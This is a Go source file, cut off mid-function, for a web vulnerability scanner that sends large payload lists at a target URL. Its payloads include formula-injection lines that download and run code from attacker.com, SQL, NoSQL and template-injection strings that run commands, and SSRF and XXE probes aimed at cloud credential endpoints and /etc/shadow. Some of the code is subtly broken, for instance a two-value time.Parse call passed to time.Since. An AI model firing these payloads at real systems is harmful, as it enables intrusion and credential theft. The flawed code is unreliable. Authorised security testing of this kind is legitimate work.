package main

import (
	"bufio"
	"crypto/tls"
	"encoding/json"
	"flag"
	"fmt"
	"io/ioutil"
	"math"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"
)

// VBAVulnerability represents a detected vulnerability
type VBAVulnerability struct {
	Type       string `json:"type"`
	URL        string `json:"url"`
	Parameter  string `json:"parameter"`
	Evidence   string `json:"evidence"`
	Severity   string `json:"severity"`
	Confidence string `json:"confidence"`
}

// ScanResult contains the scan results
type ScanResult struct {
	Target         string            `json:"target"`
	Vulnerabilities []VBAVulnerability `json:"vulnerabilities"`
	StartTime      string            `json:"start_time"`
	EndTime        string            `json:"end_time"`
	Duration       string            `json:"duration"`
	Stats          map[string]int    `json:"stats"`
}

// VBA Macro payloads for testing
var vbaPayloads = []string{
	`=cmd|'/c calc'!A1`,
	`=cmd|'/c powershell -NoP -sta -NonI -W Hidden -Enc JGkAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAaQAuAEQAbwB3AG4AbABvAGEAZABGAGkAbABlACgAJwBoAHQAdABwADoALwAvAGEAdAB0AGEAYwBrAGUAcgAuAGMAbwBtAC8AbQBhAGwAdwBhAHIAZQAuAGUAeABlACcALAAnAEMAOgBcAFwAdABlAG0AcABcAFwAbQBhAGwAdwBhAHIAZQAuAGUAeABlACcAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAnAEMAOgBcAFwAdABlAG0AcABcAFwAbQBhAGwAdwBhAHIAZQAuAGUAeABlACcA`,
	`=MSEXCEL|'\\..\\..\\Windows\\System32\\cmd.exe /c calc.exe'!A1`,
	`=MSEXCEL|'\\..\\..\\Windows\\System32\\regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll'!A1`,
	`=cmd|'/c powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://attacker.com/payload.ps1\\\")\"'!A1`,
	`=cmd|'/c rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:http://attacker.com/payload.sct\")\"'!A1`,
	`=IMPORTXML(CONCAT(\"http://attacker.com/?leak=\",CONCATENATE(A1:E1)),\"/results/result\")`,
	`=DDE(\"cmd\",\"/c calc\",\"A1\")`,
	`@SUM(1+9)*cmd|' /c calc'!A0`,
	`=HYPERLINK(\"http://attacker.com\", \"Click Here\")`,
	`+EXEC(\"cmd /c calc\")`,
	`=FORMULA(INDIRECT(\"return=shell(\"\"calc\"\")\"&CHAR(10)))`,
}

// SQL Injection payloads for testing
var sqlPayloads = []string{
	"' OR '1'='1",
	"' OR 1=1 -- -",
	"\" OR 1=1 -- -",
	"' OR '' = '",
	"'=''",
	"'LIKE'",
	"'=0--+",
	"OR 1=1",
	"' OR 'x'='x",
	"' AND id IS NULL; --",
	"'''''''''''''UNION SELECT '2",
	"' UNION SELECT NULL,NULL,NULL -- -",
	"' UNION SELECT NULL,NULL,NULL FROM DUAL -- -",
	"' UNION ORDER BY 1 -- -",
	"' UNION SELECT @@version -- -",
	"' UNION SELECT banner from v$version -- -",
	"' UNION SELECT version() -- -",
	"' UNION SELECT table_name,NULL from INFORMATION_SCHEMA.TABLES -- -",
	"' UNION SELECT column_name,NULL from INFORMATION_SCHEMA.COLUMNS where table_name='users' -- -",
	"' UNION SELECT concat(username,':',password) from users -- -",
	",(select * from (select(sleep(5)))a)",
	"';WAITFOR DELAY '0:0:5'--",
	"' OR (SELECT * FROM users) = ''",
	"admin') or ('1'='1'--",
	"1' ORDER BY 1--+",
}

// Open Redirect payloads for testing
var openRedirectPayloads = []string{
	"//evil.com",
	"//evil.com/",
	"https://evil.com",
	"https://evil.com/",
	"http://evil.com",
	"http://evil.com/",
	"//evil.com/%2f..",
	"https://evil.com/%2f..",
	"//evil.com//%2f%2e%2e",
	"https://evil.com//%2f%2e%2e",
	"///evil.com/%2f%2e%2e",
	"///evil.com/%2f..",
	"////evil.com/%2f%2e%2e",
	"////evil.com/%2f..",
	"https://evil.com/%2f%2e%2e",
	"https://evil.com/%2f..",
	"https:////evil.com/%2f%2e%2e",
	"https:////evil.com/%2f..",
	"///evil.com/%2f%2e%2e",
	"///evil.com/%2f..",
	"////evil.com/%2f%2e%2e",
	"////evil.com/%2f..",
	"https:///evil.com/%2f%2e%2e",
	"https:///evil.com/%2f..",
	"https:////evil.com/%2f%2e%2e",
	"https:////evil.com/%2f..",
	"//evil.com@example.com",
	"https://evil.com@example.com",
	"javascript:alert(1)",
	"javascript://%0Aalert(1)",
	"javascript://%0Aalert(1)//%0A",
	"data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik8L3NjcmlwdD4=",
	"Response.Redirect(\"~/folder/Login.aspx\")",
	"response.sendRedirect(\"http://www.mysite.com\")",
	"https://:@google.com@example.com",
	"<script>alert(1)</script>",
	"<svg onload=alert(1)>",
}

// Server-Side Request Forgery (SSRF) payloads
var ssrfPayloads = []string{
	"http://localhost",
	"http://127.0.0.1",
	"http://[::1]",
	"http://127.127.127.127",
	"http://127.0.1.3",
	"http://127.0.0.0",
	"http://2130706433", // Decimal representation of 127.0.0.1
	"http://0x7f000001", // Hex representation of 127.0.0.1
	"http://0177.0000.0000.0001", // Octal representation of 127.0.0.1
	"http://localhost:22",
	"http://localhost:3306",
	"http://localhost:6379",
	"http://localhost:5432",
	"http://localhost:27017",
	"http://localhost:8080",
	"http://169.254.169.254/latest/meta-data/", // AWS metadata
	"http://169.254.169.254/latest/user-data/", // AWS user data
	"http://169.254.169.254/latest/meta-data/iam/security-credentials/", // AWS IAM credentials
	"http://metadata.google.internal/computeMetadata/v1/", // GCP metadata
	"http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token", // GCP token
	"http://169.254.169.254/metadata/v1/", // DigitalOcean metadata
	"http://instance-data/latest/meta-data/", // Another AWS metadata endpoint
	"file:///etc/passwd", // Local file
	"file:///etc/shadow", // Local file
	"file:///proc/self/environ", // Process environment
	"file:///proc/self/cmdline", // Process command line
	"file:///proc/self/fd/0", // Process file descriptors
	"gopher://localhost:22/", // Gopher protocol
	"gopher://localhost:3306/", // Gopher protocol for MySQL
	"dict://localhost:11211/", // Dict protocol for memcached
}

// XML External Entity (XXE) payloads
var xxePayloads = []string{
	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>",
	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>",
	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><foo>&xxe;</foo>",
	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://localhost:22\">]><foo>&xxe;</foo>",
	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>",
	"<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><foo>&xxe;</foo>",
	"<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
	"<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><root>&xxe;</root>",
	"<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///c:/boot.ini\">]><root>&xxe;</root>",
	"<!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://localhost:22\">]><root>&xxe;</root>",
	"<!DOCTYPE root [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><root>&xxe;</root>",
	"<!DOCTYPE root [<!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\">%xxe;]><root>&xxe;</root>",
}

// Server-Side Template Injection (SSTI) payloads
var sstiPayloads = []string{
	"{{7*7}}",
	"${7*7}",
	"<%= 7*7 %>",
	"${{7*7}}",
	"#{7*7}",
	"{{config}}",
	"{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
	"{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}",
	"{{''.__class__.__mro__[1].__subclasses__()}}",
	"{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
	"{{request.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}",
	"${T(java.lang.Runtime).getRuntime().exec('id')}",
	"#{T(java.lang.Runtime).getRuntime().exec('id')}",
	"<#assign ex=\"freemarker.template.utility.Execute\"?new()>${ex(\"id\")}",
	"{{['id','/etc/passwd']|filter('system')}}",
	"{{['id','/etc/passwd']|map('system')}}",
	"{{['id','/etc/passwd']|join(' && ')|system}}",
}

// CRLF Injection payloads
var crlfPayloads = []string{
	"%0D%0A",
	"%0A",
	"%0D",
	"\r\n",
	"\r",
	"\n",
	"%0D%0ASet-Cookie: crlf=injection",
	"%0ASet-Cookie: crlf=injection",
	"%0DSet-Cookie: crlf=injection",
	"\r\nSet-Cookie: crlf=injection",
	"\nSet-Cookie: crlf=injection",
	"\rSet-Cookie: crlf=injection",
	"%0D%0ALocation: https://evil.com",
	"%0ALocation: https://evil.com",
	"%0DLocation: https://evil.com",
	"\r\nLocation: https://evil.com",
	"\nLocation: https://evil.com",
	"\rLocation: https://evil.com",
	"%0D%0AContent-Length: 0",
	"%0D%0AContent-Type: text/html",
	"%0D%0AX-XSS-Protection: 0",
	"%0D%0AContent-Security-Policy: script-src 'unsafe-inline'",
	"%0D%0AX-Frame-Options: ALLOWALL",
	"%0D%0AAccess-Control-Allow-Origin: *",
	"%0D%0AHTTPOnly: false",
	"%0D%0ARefresh: 0;url=https://evil.com",
	"%0D%0A%0D%0A<script>alert(1)</script>",
	"%0D%0A%0D%0A<img src=x onerror=alert(1)>",
	"%0D%0A%0D%0A<svg onload=alert(1)>",
	"%0D%0ASet-Cookie: crlf=injection",
	"%0ALocation: https://evil.com",
}

// Cross-Site Scripting (XSS) payloads
var xssPayloads = []string{
	"<script>alert(1)</script>",
	"<img src=x onerror=alert(1)>",
	"<svg onload=alert(1)>",
	"javascript:alert(1)",
	"<iframe src=javascript:alert(1)>",
	"'\"\"><script>alert(1)</script>",
	"\"'><img src=x onerror=alert(1)>",
	"<body onload=alert(1)>",
	"<a href=javascript:alert(1)>click me</a>",
	"<input autofocus onfocus=alert(1)>",
	"<marquee onstart=alert(1)>",
	"<form action=javascript:alert(1)><input type=submit>",
	"<isindex action=javascript:alert(1) type=submit value=click>",
	"<style>@keyframes x{}</style><xss style=animation-name:x onanimationstart=alert(1)>",
	"<link rel=stylesheet href=javascript:alert(1)>",
	"<script src=data:text/javascript,alert(1)></script>",
	"<iframe srcdoc=\"<script>alert(1)</script>\">",
	"<meta http-equiv=refresh content=\"0;url=javascript:alert(1)\">",
	"<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>",
	"<script>eval(atob('YWxlcnQoMSk='))</script>",
	"<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>",
	"<img src=1 onerror=alert(1) onload=alert(2)>",
	"<svg><set attributeName=onload value=alert(1)>",
	"<img src=x:alert(alt) onerror=eval(src) alt=1>",
	"<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
	"<svg><animate onend=alert(1) attributeName=x dur=1s>",
	"<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2>",
	"<svg><discard onbegin=alert(1)>",
	"<svg><use href=\"#x\" onbegin=alert(1)>",
	"<svg><g id=x>\"><set onbegin=alert(1)>",
	"<svg><script>alert(1)</script>",
	"<svg><!--><script>alert(1)</script>",
}

// VBA macro injection patterns to detect
var vbaPatterns = []string{
	"Sub Auto_Open()",
	"Sub AutoOpen()",
	"Sub Document_Open()",
	"Sub AutoExec()",
	"Sub Auto_Exec()",
	"Sub AutoExit()",
	"Sub Auto_Exit()",
	"Sub Document_Close()",
	"Sub DocumentChange()",
	"Sub ActivateDocument()",
	"Sub CreateObject",
	"Sub Shell",
	"Sub WScript.Shell",
	"Sub ShellExecute",
	"Sub ExecuteExcel4Macro",
	"Sub Application.Run",
	"Sub Application.RegisterXLL",
	"Sub Application.OnTime",
	"Sub Application.Evaluate",
	"Sub ActiveDocument.SaveAs",
	"Sub Document.Write",
	"Sub Process.Create",
	"Sub WMI",
	"Sub GetObject",
	"Sub URLDownloadToFile",
	"Sub Environ",
	"Sub XMLHTTP",
	"Sub WinHttpRequest",
	"Sub DynamicWrapperX",
}

// SQL error patterns to detect
var sqlErrorPatterns = []string{
	// MySQL
	"You have an error in your SQL syntax",
	"Warning: mysql_",
	"MySQLSyntaxErrorException",
	"valid MySQL result",
	"check the manual that corresponds to your MySQL server version",
	// PostgreSQL
	"PostgreSQL.*ERROR",
	"Warning: pg_",
	"valid PostgreSQL result",
	"Npgsql.",
	"PG::SyntaxError:",
	"org.postgresql.util.PSQLException",
	// Microsoft SQL Server
	"Microsoft SQL Native Client error",
	"ODBC SQL Server Driver",
	"SQLServer JDBC Driver",
	"SqlException",
	"System.Data.SqlClient.",
	"Unclosed quotation mark after the character string",
	"[SQL Server]",
	"SQLSTATE",
	"Warning: mssql_",
	// Oracle
	"ORA-[0-9][0-9][0-9][0-9]",
	"Oracle error",
	"Oracle.*Driver",
	"Warning: oci_",
	"quoted string not properly terminated",
	// SQLite
	"SQLite/JDBCDriver",
	"SQLite.Exception",
	"System.Data.SQLite.SQLiteException",
	"near \"\": syntax error",
	"SQLITE_ERROR",
	// Generic SQL errors
	"SQL syntax",
	"syntax error",
	"incorrect syntax",
	"unexpected end of SQL command",
	"unexpected token",
	"unclosed quotation mark",
	"unterminated quoted string",
	"query failed",
}

var (
	targetURL     string
	threads       int
	timeout       int
	verbose       bool
	outputFile    string
	client        *http.Client
	wg            sync.WaitGroup
	mutex         sync.Mutex
	scanResult    ScanResult
	commonParams  = []string{
		"document", "file", "filename", "doc", "docx", "xls", "xlsx", "macro", "template", 
		"content", "data", "input", "upload", "import", "export", "sheet", "workbook",
		"vba", "module", "function", "sub", "procedure", "code", "script", "automation",
		"office", "excel", "word", "powerpoint", "access", "outlook", "project", "visio",
	}
	// SQL injection related parameters
	sqlParams     = []string{
		"id", "user", "username", "user_id", "userid", "login", "password", "pass", "key", "email", 
		"name", "search", "query", "q", "keyword", "keywords", "category", "cat", "type", "sort", 
		"order", "filter", "limit", "offset", "page", "start", "end", "from", "to", "date", 
		"year", "month", "day", "time", "token", "auth", "session", "account", "item", "product", 
		"pid", "p", "action", "method", "callback", "return", "redirect", "url", "site", "target",
		"view", "table", "db", "database", "select", "update", "insert", "delete", "where", "value",
	}
	scanSQLi      bool = true
)

// Account Takeover (ATO) test payloads & scenarios
var atoPayloads = []string{
	// Common weak reset tokens
	"000000",
	"123456",
	"abcdef",
	// Email change attempts
	"{'email': 'attacker@example.com'}",
	// Session fixation
	"PHPSESSID=attacker",
	"JSESSIONID=attacker",
	// Password reset links with predictable tokens
	"/reset?token=123456",
	"/reset?token=abcdef",
	// Username enumeration
	"{'username': 'admin'}",
}

// Business Logic Error test payloads & scenarios
var businessLogicPayloads = []string{
	// Negative quantity/price
	"quantity=-1",
	"price=-100",
	// Bypass limits
	"amount=1000000",
	// Unauthorized role escalation
	"role=admin",
	// Multiple purchases with single-use coupon
	"coupon=FREE100",
	// Repeated transaction attempts
	"repeat=10",
}

// NoSQL Injection payloads
var nosqlPayloads = []string{
	// MongoDB
	"{\"username\":{\"$ne\":null},\"password\":{\"$ne\":null}}",
	"{\"username\":{\"$gt\":\"\"}}",
	"{\"$or\":[{},{}]}",
	"{\"$where\":\"1==1\"}",
	// CouchDB
	"_id[$ne]=1",
	// Array injection
	"username[]=admin&password[]=admin",
	// Boolean-based
	"username=admin' || '1'=='1",
}

// GraphQL Injection payloads
var graphqlPayloads = []string{
	// Introspection
	"{ __schema { types { name fields { name } } } }",
	// Query injection
	"{ user(id: 1) { id username password } }",
	// Field injection
	"{ allUsers { id username email password } }",
	// Malformed query
	"{ __typename }",
	// Aliased query
	"query x { y: allUsers { id } }",
	// Batch query
	"{ a: user(id:1){id}, b: user(id:2){id} }",
	// Injection attempt
	"{ user(id: \"1 OR 1=1\") { id username } }",
}

func main() {
	// Parse command line flags
	flag.StringVar(&targetURL, "url", "", "Target URL to scan")
	flag.StringVar(&outputFile, "output", "scan_results.json", "Output file for scan results")
	flag.BoolVar(&scanSQLi, "sqli", false, "Enable SQL injection scanning")
	flag.IntVar(&threads, "threads", 10, "Number of concurrent threads")
	flag.IntVar(&timeout, "timeout", 10, "Timeout in seconds for HTTP requests")
	flag.BoolVar(&verbose, "verbose", false, "Enable verbose output")
	flag.Parse()

	// Check if target URL is provided
	if targetURL == "" {
		fmt.Println("Error: Target URL is required")
		flag.Usage()
		os.Exit(1)
	}

	// Initialize HTTP client with timeout and TLS settings
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client = &http.Client{
		Timeout:   time.Duration(timeout) * time.Second,
		Transport: tr,
	}

	// Initialize scan results
	scanResult = ScanResult{
		Target:         targetURL,
		Vulnerabilities: []VBAVulnerability{},
		StartTime:      time.Now().Format(time.RFC3339),
		Stats:          make(map[string]int),
	}

	// Print banner and scan info
	printBanner()
	printScanInfo()

	// Start scanning
	startScan()

	// Wait for all goroutines to finish
	wg.Wait()

	// Finalize scan results
	scanResult.EndTime = time.Now().Format(time.RFC3339)
	duration := time.Since(time.Parse(time.RFC3339, scanResult.StartTime))
	scanResult.Duration = duration.String()

	// Print summary
	printSummary()

	// Save results to file if specified
	if outputFile != "" {
		saveResults()
	}
}

func printBanner() {
	// ANSI color codes
	blue := "\033[34m"
	cyan := "\033[36m"
	green := "\033[32m"
	yellow := "\033[33m"
	red := "\033[31m"
	reset := "\033[0m"
	
	// Print ASCII art logo
	fmt.Printf("%s", blue)
	fmt.Println("    _       _   _              __  __ _____ _____ ")
	fmt.Println("   / \\   ___| |_| |__   ___ _ _\\ \\/ // ____/ ____|")  
	fmt.Println("  / _ \\ / _ \\ __| '_ \\ / _ \\ '__\\  /| (___| (___  ")
	fmt.Println(" / ___ \\  __/ |_| | | |  __/ |  /  \\ \\___ \\___ \\ ")
	fmt.Println("/_/   \\_\\___|\\__|_| |_|\\___|_| /_/\\_\\____/|____/ ")
	fmt.Printf("%s", reset)
	
	// Print version and description
	fmt.Printf("%sv1.0.0%s\n", cyan, reset)
	fmt.Printf("%sAdvanced vulnerability scanner for web applications.%s\n", green, reset)
	fmt.Printf("%sSupports XSS, SQLi, SSRF, XXE, SSTI, CRLF, Open Redirect and more.%s\n\n", green, reset)
}

func printScanInfo() {
	// ANSI color codes
	blue := "\033[34m"
	cyan := "\033[36m"
	green := "\033[32m"
	yellow := "\033[33m"
	red := "\033[31m"
	magenta := "\033[35m"
	reset := "\033[0m"
	
	// Print scan information
	fmt.Printf("%s➤%s 👾Target      : %s%s%s\n", yellow, reset, cyan, targetURL, reset)
	fmt.Printf("%s➤%s 🛠Method      : %sGET%s\n", yellow, reset, cyan, reset)
	fmt.Printf("%s➤%s 🚀Performance : %s%d worker / %d threads%s\n", yellow, reset, cyan, 1, threads, reset)
	fmt.Printf("%s➤%s 🎯Mining      : %strue (Parameter Mining Enabled)%s\n", yellow, reset, cyan, reset)
	fmt.Printf("%s➤%s 🕰Time        : %s%s%s\n", yellow, reset, cyan, time.Now().Format("2006-01-02 15:04:05"), reset)
	fmt.Printf("%s➤%s 📝Output      : %s%s%s\n\n", yellow, reset, cyan, outputFile, reset)
	
	fmt.Printf("%s[%s*%s] %sStarting scan of %s%s%s\n", blue, yellow, blue, reset, cyan, targetURL, reset)
	fmt.Printf("%s[%s*%s] %sParameter analysis in progress... %s🔍%s\n", blue, yellow, blue, reset, magenta, reset)
}

func startScan() {
	// Create a semaphore channel to limit concurrent goroutines
	semaphore := make(chan struct{}, threads)
	
	// Test for VBA macro injection vulnerabilities
	fmt.Println("[*] Testing for VBA macro injection vulnerabilities...")
	
	// Test each parameter with each payload
	for _, param := range commonParams {
		for _, payload := range vbaPayloads {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore
			
			go func(p string, pl string) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore
				
				testVBAInjection(p, pl)
			}(param, payload)
		}
	}
	
	// Test for SQL injection vulnerabilities if enabled
	if scanSQLi {
		fmt.Println("[*] Testing for SQL injection vulnerabilities...")
		
		// Test each parameter with each payload
		for _, param := range sqlParams {
			for _, payload := range sqlPayloads {
				wg.Add(1)
				semaphore <- struct{}{} // Acquire semaphore
				
				go func(p string, pl string) {
					defer wg.Done()
					defer func() { <-semaphore }() // Release semaphore
					
					testSQLInjection(p, pl)
				}(param, payload)
			}
		}
	}
	
	// Test for Open Redirect vulnerabilities
	fmt.Println("[*] Testing for Open Redirect vulnerabilities...")
	
	// Parameters that are commonly vulnerable to open redirect
	openRedirectParams := []string{"redirect", "url", "next", "return", "returnTo", "returnUrl", "goto", "to", "link", "location", "path", "dest", "destination"}
	
	// Test each parameter with each payload
	for _, param := range openRedirectParams {
		for _, payload := range openRedirectPayloads {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore
			
			go func(p string, pl string) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore
				
				testOpenRedirect(p, pl)
			}(param, payload)
		}
	}
	
	// Test for SSRF vulnerabilities
	fmt.Println("[*] Testing for Server-Side Request Forgery (SSRF) vulnerabilities...")
	
	// Parameters that are commonly vulnerable to SSRF
	ssrfParams := []string{"url", "uri", "api", "endpoint", "src", "source", "data", "path", "load", "page", "file", "dir", "domain", "site", "target",
		"view", "table", "db", "database", "select", "update", "insert", "delete", "where", "value",
	}
	
	// Test each parameter with each payload
	for _, param := range ssrfParams {
		for _, payload := range ssrfPayloads {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore
			
			go func(p string, pl string) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore
				
				testSSRF(p, pl)
			}(param, payload)
		}
	}
	
	// Test for XSS vulnerabilities
	fmt.Println("[*] Testing for Cross-Site Scripting (XSS) vulnerabilities...")
	
	// Parameters that are commonly vulnerable to XSS
	xssParams := []string{
		"q", "s", "search", "id", "name", "message", "content", "comment", "input", 
		"username", "user", "email", "title", "description", "query", "text", "body", 
		"subject", "msg", "data", "feedback", "return", "returnUrl", "callback", "value", 
		"html", "page", "keywords", "url", "file", "filename", "type", "preview", "view", 
		"template", "redirect", "uri", "src", "source", "display", "output", "op", "action",
		"category", "cat", "tag", "article", "post", "note", "filter", "ref", "item", 
		"format", "pretty", "lang", "language", "jsonp", "method", "order", "sort", "dir"
	}
	
	// Test each parameter with each payload
	for _, param := range xssParams {
		for _, payload := range xssPayloads {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore
			
			go func(p string, pl string) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore
				
				testXSS(p, pl)
			}(param, payload)
		}
	}
	
	// Test for CRLF Injection vulnerabilities
	fmt.Println("[*] Testing for CRLF Injection vulnerabilities...")
	
	// Parameters that are commonly vulnerable to CRLF Injection
	crlfParams := []string{"url", "uri", "redirect", "next", "return", "returnTo", "returnUrl", "goto", "to", "link", "location", "path", "dest", "destination", "callback", "data", "page", "site", "q", "search", "id", "lang", "view"}
	
	// Test each parameter with each payload
	for _, param := range crlfParams {
		for _, payload := range crlfPayloads {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore
			
			go func(p string, pl string) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore
				
				testCRLF(p, pl)
			}(param, payload)
		}
	}
	
	// Test for SSTI vulnerabilities
	fmt.Println("[*] Testing for Server-Side Template Injection (SSTI) vulnerabilities...")
	
	// Parameters that are commonly vulnerable to SSTI
	stiParams := []string{
		"template", "page", "view", "theme", "layout", "path", "file", "include", 
		"require", "render", "name", "id", "content", "callback", "message", "msg", 
		"text", "data", "body", "param", "value", "q", "query", "search", "input", 
		"subject", "title", "html", "output", "display", "source", "src", "dest", 
		"redirect", "uri", "url", "target", "action", "type", "style", "language", "lang"
	}
	
	// Test each parameter with each payload
	for _, param := range stiParams {
		for _, payload := range sstiPayloads {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore
			
			go func(p string, pl string) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore
				
				testSSTI(p, pl)
			}(param, payload)
		}
	}
	
	// Test for XXE vulnerabilities
	fmt.Println("[*] Testing for XML External Entity (XXE) vulnerabilities...")
	
	// Parameters that are commonly vulnerable to XXE
	xxeParams := []string{
		"xml", "data", "input", "request", "payload", "content", "body", "file", 
		"document", "feed", "rss", "soap", "wsdl", "xsd", "xsl", "xslt", "dtd", 
		"entity", "upload", "import", "service", "api", "format", "text", "post", "put"
	}
	
	// Test each parameter with each payload
	for _, param := range xxeParams {
		for _, payload := range xxePayloads {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore
			
			go func(p string, pl string) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore
				
				testXXE(p, pl)
			}(param, payload)
		}
	}
	
	// Test for Account Takeover (ATO) vulnerabilities
	fmt.Println("[*] Testing for Account Takeover (ATO) vulnerabilities...")
	
	// Parameters that are commonly vulnerable to ATO
	atoParams := []string{"email", "username", "password", "reset", "recover", "login", "auth"}
	
	// Test each parameter with each payload
	for _, param := range atoParams {
		for _, payload := range atoPayloads {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore
			
			go func(p string, pl string) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore
				
				testATO(p, pl)
			}(param, payload)
		}
	}
	
	// Test for Business Logic Error vulnerabilities
	fmt.Println("[*] Testing for Business Logic Error vulnerabilities...")
	
	// Parameters that are commonly vulnerable to Business Logic Errors
	businessLogicParams := []string{"quantity", "price", "amount", "role", "coupon", "repeat"}
	
	// Test each parameter with each payload
	for _, param := range businessLogicParams {
		for _, payload := range businessLogicPayloads {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore
			
			go func(p string, pl string) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore
				
				testBusinessLogic(p, pl)
			}(param, payload)
		}
	}
	
	// Test for NoSQL Injection vulnerabilities
	fmt.Println("[*] Testing for NoSQL Injection vulnerabilities...")
	
	// Parameters that are commonly vulnerable to NoSQL Injection
	nosqlParams := []string{"username", "password", "id", "user_id", "userid", "login", "name", "search", "query", "q"}
	
	// Test each parameter with each payload
	for _, param := range nosqlParams {
		for _, payload := range nosqlPayloads {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore
			
			go func(p string, pl string) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore
				
				testNoSQLInjection(p, pl)
			}(param, payload)
		}
	}
	
	// Test for GraphQL Injection vulnerabilities
	fmt.Println("[*] Testing for GraphQL Injection vulnerabilities...")
	
	// Parameters that are commonly vulnerable to GraphQL Injection
	graphqlParams := []string{"query", "mutation", "subscription", "id", "user_id", "userid", "login", "name", "search", "q"}
	
	// Test each parameter with each payload
	for _, param := range graphqlParams {
		for _, payload := range graphqlPayloads {
			wg.Add(1)
			semaphore <- struct{}{} // Acquire semaphore
			
			go func(p string, pl string) {
				defer wg.Done()
				defer func() { <-semaphore }() // Release semaphore
				
				testGraphQLInjection(p, pl)
			}(param, payload)
		}
	}
}

func testVBAInjection(param, payload string) {
	// Construct test URL
	testURL := constructURL(targetURL, param, payload)
	
	if verbose {
		fmt.Printf("[*] Testing parameter '%s' with payload: %s\n", param, payload)
	}
	
	// Send GET request
	resp, err := sendRequest("GET", testURL, "")
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error testing %s: %s\n", testURL, err)
		}
		return
	}
	
	// Read response body
	body, err := ioutil.ReadAll(resp.Body)
	resp.Body.Close()
	if err != nil {
		if verbose {
			fmt.Printf("[!] Error reading response from %s: %s\n", testURL, err)
		}
		return
	}
	
	// Check for VBA patterns in response
	bodyStr := string(body)
	for _, pattern := range vbaPatterns {
		if strings.Contains(bodyStr, pattern) {
			// Vulnerability found
			mutex.Lock()
			vuln := VBAVulnerability{
				Type:       "VBA Macro Injection",
				URL:        testURL,
				Parameter:  param,
				Evidence:   fmt.Sprintf("Found pattern: %s", pattern),
				Severity:   "High",
				Confidence: "Medium",
			}
			scanResult.Vulnerabilities = append(scanResult.Vulnerabilities, vuln)
			scanResult.Stats["vulnerabilities"] = len(scanResult.Vulnerabilities)
			mutex.Unlock()
			
			fmt.Printf("[!] VBA Macro Injection vulnerability found!\n")
			fmt.Printf("    URL: %s\n", testURL)
			fmt.Printf("    Parameter: %s\n", param)
			fmt.Printf("    Pattern: %s\n", pattern)
			fmt.Printf("    Payload: %s\n\n", payload)
			
			// Test if payload is reflected in response
			if strings.Contains(bodyStr, payload) {
				mutex.Lock()
				vuln := VBAVulnerability{
					Type:       "VBA Macro Injection (Reflected)",
					URL:        testURL,
					Parameter:  param,
					Evidence:   fmt.Sprintf("Payload reflected: %s", payload),
					Severity:   "Critical",
					Confidence: "High",
				}
				scanResult.Vulnerabilities = append(scanResult.Vulnerabilities, vuln)
				scanResult.Stats["vulnerabilities"] = len(scanResult.Vulnerabilities)
				mutex.Unlock()
				
